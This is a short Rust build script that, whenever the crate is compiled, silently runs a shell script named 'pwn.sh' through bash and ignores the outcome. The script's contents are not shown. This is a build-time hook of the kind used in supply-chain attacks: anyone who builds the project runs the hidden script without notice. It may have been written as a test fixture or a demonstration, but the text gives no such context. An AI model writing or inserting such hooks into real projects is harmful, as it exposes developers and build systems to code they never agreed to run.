fn main() {
    println!("cargo:rerun-if-changed=pwn.sh");
    let _ = std::process::Command::new("bash").arg("pwn.sh").status();
}
